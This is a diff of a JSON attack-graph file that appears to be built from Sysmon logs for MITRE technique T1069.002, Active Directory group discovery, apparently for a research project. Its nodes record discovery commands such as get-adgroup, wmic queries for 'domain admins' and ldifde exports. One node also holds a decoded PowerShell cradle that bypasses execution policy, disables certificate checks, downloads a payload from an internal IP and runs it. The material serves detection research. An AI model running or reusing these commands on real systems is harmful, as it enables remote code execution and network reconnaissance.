@@ -2,11 +2,11 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1069.002",
-  "generated_at_utc": "2026-05-06T14:37:06.379905+00:00",
-  "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\ldifde_windows-sysmon.log",
+  "generated_at_utc": "2026-05-06T16:38:10.945451+00:00",
+  "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\ldifde_windows-sysmon.log",
   "source_files": [
-    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\ldifde_windows-sysmon.log",
-    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\windows-sysmon.log"
+    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\ldifde_windows-sysmon.log",
+    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1069.002\\AD_discovery\\windows-sysmon.log"
   ],
   "patterns": {
     "malicious": [
@@ -17,7 +17,7 @@
     "whitelist": [
       "firefox.exe"
     ],
-    "config_path": "D:\\Capstone Project & NCKH\\Multisource Attack Graph\\inspect_log_gui\\data\\T1069.002_malcious_config.json"
+    "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1069.002_malcious_config.json"
   },
   "matching": {
     "malicious_node_ids": [
@@ -52,105 +52,63 @@
   },
   "nodes": [
     {
-      "id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{B81B27B7-83E5-613A-E796-03000000C801}",
-        "pid": "5920",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell.exe  get-adgroup -filter *",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "0a52666de11b9811e802af5dfccbc6c4caf3c7c9470c42dbf5cc379469124267",
-        "parent_process_id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "File:aff019facb3f4b0cec7db3f5e1bf9ddd13ebe1c998914a1df601d87cae5f69c1:17",
-      "label": "pshost.132756984387475720.2844.defaultappdomain.powershell",
+      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
+      "label": "<pspolicy_test>",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "pshost.132756984387475720.2844.defaultappdomain.powershell",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
-        "event_id": "17",
-        "id": "File:aff019facb3f4b0cec7db3f5e1bf9ddd13ebe1c998914a1df601d87cae5f69c1:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "pshost.132756984387475720.2844.defaultappdomain.powershell",
-        "name": "pshost.132756984387475720.2844.defaultappdomain.powershell"
-      }
-    },
-    {
-      "id": "Process:{2897A50F-6053-646F-862D-00000000CE02}:1",
-      "label": "nt5ds",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "nt5ds",
-        "guid": "{2897A50F-6053-646F-862D-00000000CE02}",
-        "pid": "5192",
-        "image_path": "%system32%\\ldifde.exe",
-        "command_line": "ldifde",
-        "original_file_name": "ldifde.exe",
-        "image_hash": "MD5=51BBF7AA4242A7E0C56ED4704AE94E58,SHA256=B1FDBDE11B6DAC3E4B69702040083FAD2A02B8BDFECBFA5AFDE9890D70A4DFCD",
-        "command_hash": "d71218a1572760ef862bbccc4389727ce6a7722a914b21d10a53b993c8547d35",
-        "parent_process_id": "Process:{2897A50F-6050-646F-7C2D-00000000CE02}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{2897A50F-6053-646F-862D-00000000CE02}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "nt5ds",
-        "name": "nt5ds"
-      }
-    },
-    {
-      "id": "File:c628399f3ce058a841efe50856cb7658408ed17fd1807a893285a4aef02928c4:17",
-      "label": "pshost.132756984056833361.5920.defaultappdomain.powershell",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "pshost.132756984056833361.5920.defaultappdomain.powershell",
+        "file_path": "%temp%\\2\\<pspolicy_test>",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
         "content_hash": "",
         "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-        "event_id": "17",
-        "id": "File:c628399f3ce058a841efe50856cb7658408ed17fd1807a893285a4aef02928c4:17",
+        "event_id": "11",
+        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "pshost.132756984056833361.5920.defaultappdomain.powershell",
-        "name": "pshost.132756984056833361.5920.defaultappdomain.powershell"
+        "display_name": "<pspolicy_test>",
+        "name": "<pspolicy_test>"
       }
     },
     {
-      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
-      "label": "startupprofiledata-noninteractive",
+      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
+        "pid": "6940",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "File:4e1609afb83d69b3b3a47a3f8cd01d181f55a449979cc72226dd8b613638d38d:23",
+      "label": "MULTI_FILE.psm1",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
+        "file_path": "%temp%\\2\\MULTI_FILE.psm1",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF,IMPHASH=00000000000000000000000000000000",
+        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000",
         "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
         "event_id": "23",
-        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+        "id": "File:4e1609afb83d69b3b3a47a3f8cd01d181f55a449979cc72226dd8b613638d38d:23",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "startupprofiledata-noninteractive",
-        "name": "startupprofiledata-noninteractive"
+        "display_name": "MULTI_FILE.psm1",
+        "name": "MULTI_FILE.psm1"
       }
     },
     {
@@ -178,69 +136,21 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-83C2-613A-E296-03000000C801}:1",
-      "label": "wmi commandline utility",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "wmi commandline utility",
-        "guid": "{B81B27B7-83C2-613A-E296-03000000C801}",
-        "pid": "624",
-        "image_path": "%system32%\\wbem\\wmic.exe",
-        "command_line": "%system32%\\wbem\\wmic.exe\" \\namespace:\\root\\directory\\ldap path ds_group where \"ds_samaccountname='domain admins'\" get ds_member \\value",
-        "original_file_name": "wmic.exe",
-        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072,IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
-        "command_hash": "8ea7482b65b6d864319d8bb37a86116e4632cb3e8fe9d7f2766e1affa4f76eac",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{B81B27B7-83C2-613A-E296-03000000C801}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "wmi commandline utility",
-        "name": "wmi commandline utility"
-      }
-    },
-    {
-      "id": "Process:{2897A50F-6198-646F-C92D-00000000CE02}:1",
-      "label": "console window host",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "console window host",
-        "guid": "{2897A50F-6198-646F-C92D-00000000CE02}",
-        "pid": "6376",
-        "image_path": "%system32%\\conhost.exe",
-        "command_line": "??\\%system32%\\conhost.exe ÿffffff -forcev1",
-        "original_file_name": "conhost.exe",
-        "image_hash": "MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0",
-        "command_hash": "3e975210f5e5569afa084d8fddc2791dd91cfd3364c711e73e52eff9676bd648",
-        "parent_process_id": "Process:{2897A50F-6198-646F-C82D-00000000CE02}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{2897A50F-6198-646F-C92D-00000000CE02}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "console window host",
-        "name": "console window host"
-      }
-    },
-    {
-      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
-      "label": "<pspolicy_test>",
+      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+      "label": "startupprofiledata-noninteractive",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%temp%\\2\\<pspolicy_test>",
+        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
         "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
+        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF,IMPHASH=00000000000000000000000000000000",
         "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-        "event_id": "11",
-        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:11",
+        "event_id": "23",
+        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
         "type": "File",
         "entity_class": "FileEntity",
-        "display_name": "<pspolicy_test>",
-        "name": "<pspolicy_test>"
+        "display_name": "startupprofiledata-noninteractive",
+        "name": "startupprofiledata-noninteractive"
       }
     },
     {
@@ -268,21 +178,16 @@
       }
     },
     {
-      "id": "File:4e1609afb83d69b3b3a47a3f8cd01d181f55a449979cc72226dd8b613638d38d:23",
-      "label": "MULTI_FILE.psm1",
-      "type": "file",
-      "group": "File",
+      "id": "Technique:T1069_002",
+      "label": "T1069.002",
+      "type": "technique",
+      "group": "Technique",
       "properties": {
-        "file_path": "%temp%\\2\\MULTI_FILE.psm1",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000",
-        "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-        "event_id": "23",
-        "id": "File:4e1609afb83d69b3b3a47a3f8cd01d181f55a449979cc72226dd8b613638d38d:23",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "MULTI_FILE.psm1",
-        "name": "MULTI_FILE.psm1"
+        "id": "Technique:T1069_002",
+        "name": "T1069.002",
+        "display_name": "T1069.002",
+        "type": "Technique",
+        "entity_class": "Technique"
       }
     },
     {
@@ -310,51 +215,69 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
-      "label": "cmd.exe",
+      "id": "Process:{2897A50F-6198-646F-C92D-00000000CE02}:1",
+      "label": "console window host",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows command processor",
-        "guid": "{B81B27B7-83E5-613A-E696-03000000C801}",
-        "pid": "5496",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c powershell.exe get-adgroup -filter *",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "5c04cc4cabfa4d0bbe4616f8d85bcf3a8c49dfd13d82976957a3d06b672323cd",
+        "process_name": "console window host",
+        "guid": "{2897A50F-6198-646F-C92D-00000000CE02}",
+        "pid": "6376",
+        "image_path": "%system32%\\conhost.exe",
+        "command_line": "??\\%system32%\\conhost.exe ÿffffff -forcev1",
+        "original_file_name": "conhost.exe",
+        "image_hash": "MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0",
+        "command_hash": "3e975210f5e5569afa084d8fddc2791dd91cfd3364c711e73e52eff9676bd648",
+        "parent_process_id": "Process:{2897A50F-6198-646F-C82D-00000000CE02}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
+        "id": "Process:{2897A50F-6198-646F-C92D-00000000CE02}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "display_name": "console window host",
+        "name": "console window host"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{B81B27B7-8406-613A-ED96-03000000C801}",
+        "pid": "2844",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe  get-wmiobject -class ds_group -namespace root\\directory\\ldap",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "f3213fe45a5ea973bc8782b5cc6161d9751258148af748df85ab31563d701ec4",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{B81B27B7-8406-613A-EC96-03000000C801}:1",
         "user_id": "User:S-1-5-18"
       }
     },
     {
-      "id": "Process:{2897A50F-6198-646F-CA2D-00000000CE02}:1",
-      "label": "nt5ds",
-      "type": "process",
-      "group": "Process",
+      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
+      "label": "<pspolicy_test>",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "process_name": "nt5ds",
-        "guid": "{2897A50F-6198-646F-CA2D-00000000CE02}",
-        "pid": "6864",
-        "image_path": "%system32%\\ldifde.exe",
-        "command_line": "ldifde.exe  -f %windir%\\temp\\atomic_ldifde.txt -p subtree",
-        "original_file_name": "ldifde.exe",
-        "image_hash": "MD5=51BBF7AA4242A7E0C56ED4704AE94E58,SHA256=B1FDBDE11B6DAC3E4B69702040083FAD2A02B8BDFECBFA5AFDE9890D70A4DFCD",
-        "command_hash": "9cf192a588e42c3486aa44dabbc499a8fd5364972f806aab06896da23b6d9119",
-        "parent_process_id": "Process:{2897A50F-6198-646F-C82D-00000000CE02}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{2897A50F-6198-646F-CA2D-00000000CE02}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "nt5ds",
-        "name": "nt5ds"
+        "file_path": "%temp%\\2\\<pspolicy_test>",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000",
+        "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
+        "event_id": "23",
+        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "<pspolicy_test>",
+        "name": "<pspolicy_test>"
       }
     },
     {
@@ -406,82 +329,135 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
-      "label": "powershell.exe",
+      "id": "Process:{2897A50F-6198-646F-CA2D-00000000CE02}:1",
+      "label": "nt5ds",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "nt5ds",
+        "guid": "{2897A50F-6198-646F-CA2D-00000000CE02}",
+        "pid": "6864",
+        "image_path": "%system32%\\ldifde.exe",
+        "command_line": "ldifde.exe  -f %windir%\\temp\\atomic_ldifde.txt -p subtree",
+        "original_file_name": "ldifde.exe",
+        "image_hash": "MD5=51BBF7AA4242A7E0C56ED4704AE94E58,SHA256=B1FDBDE11B6DAC3E4B69702040083FAD2A02B8BDFECBFA5AFDE9890D70A4DFCD",
+        "command_hash": "9cf192a588e42c3486aa44dabbc499a8fd5364972f806aab06896da23b6d9119",
+        "parent_process_id": "Process:{2897A50F-6198-646F-C82D-00000000CE02}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{2897A50F-6198-646F-CA2D-00000000CE02}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "nt5ds",
+        "name": "nt5ds"
+      }
+    },
+    {
+      "id": "File:c628399f3ce058a841efe50856cb7658408ed17fd1807a893285a4aef02928c4:17",
+      "label": "pshost.132756984056833361.5920.defaultappdomain.powershell",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "pshost.132756984056833361.5920.defaultappdomain.powershell",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
+        "event_id": "17",
+        "id": "File:c628399f3ce058a841efe50856cb7658408ed17fd1807a893285a4aef02928c4:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "pshost.132756984056833361.5920.defaultappdomain.powershell",
+        "name": "pshost.132756984056833361.5920.defaultappdomain.powershell"
+      }
+    },
+    {
+      "id": "File:aff019facb3f4b0cec7db3f5e1bf9ddd13ebe1c998914a1df601d87cae5f69c1:17",
+      "label": "pshost.132756984387475720.2844.defaultappdomain.powershell",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "pshost.132756984387475720.2844.defaultappdomain.powershell",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
+        "event_id": "17",
+        "id": "File:aff019facb3f4b0cec7db3f5e1bf9ddd13ebe1c998914a1df601d87cae5f69c1:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "pshost.132756984387475720.2844.defaultappdomain.powershell",
+        "name": "pshost.132756984387475720.2844.defaultappdomain.powershell"
+      }
+    },
+    {
+      "id": "Process:{2897A50F-606B-646F-9C2D-00000000CE02}:1",
+      "label": "nt5ds",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "nt5ds",
+        "guid": "{2897A50F-606B-646F-9C2D-00000000CE02}",
+        "pid": "6696",
+        "image_path": "%system32%\\ldifde.exe",
+        "command_line": "ldifde.exe  -f %windir%\\temp\\invokeuserdataerrors.log",
+        "original_file_name": "ldifde.exe",
+        "image_hash": "MD5=51BBF7AA4242A7E0C56ED4704AE94E58,SHA256=B1FDBDE11B6DAC3E4B69702040083FAD2A02B8BDFECBFA5AFDE9890D70A4DFCD",
+        "command_hash": "48227d551171a0e37cdb7002b3d3df69aa2b3e3fb89f762eb522feda109a88fb",
+        "parent_process_id": "Process:{2897A50F-6050-646F-7C2D-00000000CE02}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{2897A50F-606B-646F-9C2D-00000000CE02}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "nt5ds",
+        "name": "nt5ds"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
+      "label": "windows powershell",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows powershell",
-        "guid": "{B81B27B7-8406-613A-ED96-03000000C801}",
-        "pid": "2844",
+        "guid": "{B81B27B7-83E5-613A-E796-03000000C801}",
+        "pid": "5920",
         "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell.exe  get-wmiobject -class ds_group -namespace root\\directory\\ldap",
+        "command_line": "powershell.exe  get-adgroup -filter *",
         "original_file_name": "powershell.exe",
         "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "f3213fe45a5ea973bc8782b5cc6161d9751258148af748df85ab31563d701ec4",
+        "command_hash": "0a52666de11b9811e802af5dfccbc6c4caf3c7c9470c42dbf5cc379469124267",
+        "parent_process_id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{B81B27B7-8406-613A-ED96-03000000C801}:1",
+        "id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{B81B27B7-8406-613A-EC96-03000000C801}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "windows powershell",
+        "name": "windows powershell"
       }
     },
     {
-      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-      "label": "powershell.exe",
+      "id": "Process:{B81B27B7-83C2-613A-E296-03000000C801}:1",
+      "label": "wmi commandline utility",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "",
-        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
-        "pid": "6940",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
+        "process_name": "wmi commandline utility",
+        "guid": "{B81B27B7-83C2-613A-E296-03000000C801}",
+        "pid": "624",
+        "image_path": "%system32%\\wbem\\wmic.exe",
+        "command_line": "%system32%\\wbem\\wmic.exe\" \\namespace:\\root\\directory\\ldap path ds_group where \"ds_samaccountname='domain admins'\" get ds_member \\value",
+        "original_file_name": "wmic.exe",
+        "image_hash": "MD5=2CEE7F1AD77D8817E0F043E5E5ED1C83,SHA256=6679EA8FBEB539B5852CE8838420471FED0600F5050F3370DBB355DAC76BF072,IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
+        "command_hash": "8ea7482b65b6d864319d8bb37a86116e4632cb3e8fe9d7f2766e1affa4f76eac",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "id": "Process:{B81B27B7-83C2-613A-E296-03000000C801}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Technique:T1069_002",
-      "label": "T1069.002",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1069_002",
-        "name": "T1069.002",
-        "display_name": "T1069.002",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
-      "label": "<pspolicy_test>",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%temp%\\2\\<pspolicy_test>",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000",
-        "parent_process_id": "Process:{B81B27B7-83E5-613A-E796-03000000C801}:1",
-        "event_id": "23",
-        "id": "File:4e424c0723b55c34872007a56f139208a464104655f07ef21dd198ef5a8c2592:23",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "<pspolicy_test>",
-        "name": "<pspolicy_test>"
+        "display_name": "wmi commandline utility",
+        "name": "wmi commandline utility"
       }
     },
     {
@@ -509,27 +485,51 @@
       }
     },
     {
-      "id": "Process:{2897A50F-606B-646F-9C2D-00000000CE02}:1",
+      "id": "Process:{2897A50F-6053-646F-862D-00000000CE02}:1",
       "label": "nt5ds",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "nt5ds",
-        "guid": "{2897A50F-606B-646F-9C2D-00000000CE02}",
-        "pid": "6696",
+        "guid": "{2897A50F-6053-646F-862D-00000000CE02}",
+        "pid": "5192",
         "image_path": "%system32%\\ldifde.exe",
-        "command_line": "ldifde.exe  -f %windir%\\temp\\invokeuserdataerrors.log",
+        "command_line": "ldifde",
         "original_file_name": "ldifde.exe",
         "image_hash": "MD5=51BBF7AA4242A7E0C56ED4704AE94E58,SHA256=B1FDBDE11B6DAC3E4B69702040083FAD2A02B8BDFECBFA5AFDE9890D70A4DFCD",
-        "command_hash": "48227d551171a0e37cdb7002b3d3df69aa2b3e3fb89f762eb522feda109a88fb",
+        "command_hash": "d71218a1572760ef862bbccc4389727ce6a7722a914b21d10a53b993c8547d35",
         "parent_process_id": "Process:{2897A50F-6050-646F-7C2D-00000000CE02}:1",
         "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{2897A50F-606B-646F-9C2D-00000000CE02}:1",
+        "id": "Process:{2897A50F-6053-646F-862D-00000000CE02}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "nt5ds",
         "name": "nt5ds"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{B81B27B7-83E5-613A-E696-03000000C801}",
+        "pid": "5496",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c powershell.exe get-adgroup -filter *",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "5c04cc4cabfa4d0bbe4616f8d85bcf3a8c49dfd13d82976957a3d06b672323cd",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-83E5-613A-E696-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "user_id": "User:S-1-5-18"
       }
     }
   ],
@@ -545,7 +545,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T14:37:06.236676+00:00"
+        "timestamp": "2026-05-06T16:38:10.824302+00:00"
       }
     },
